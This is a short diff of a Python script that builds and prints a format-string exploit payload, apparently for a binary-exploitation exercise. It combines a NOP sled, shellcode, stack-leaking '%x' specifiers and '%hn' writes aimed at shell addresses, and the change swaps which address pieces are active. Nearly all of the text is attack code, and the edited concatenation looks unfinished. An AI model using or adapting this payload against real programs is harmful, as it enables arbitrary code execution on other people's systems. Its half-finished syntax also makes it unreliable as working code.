@@ -40,7 +40,7 @@ LENTGHOFREQUIRED = 316
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
     stdout.write(NOPSLED + SHELLCODE + b'%x.'*291 + b'%016llx' + 
-    #'''ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' + b'%hn'+ b'%' + 
+    ADDRESSOFSHELL1 + #b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' + b'%hn'+ b'%' + 
     #ADDRESSOFSHELL3 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL4 + b'x' + b'%hn' +
     #ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + '''
     b'\n')
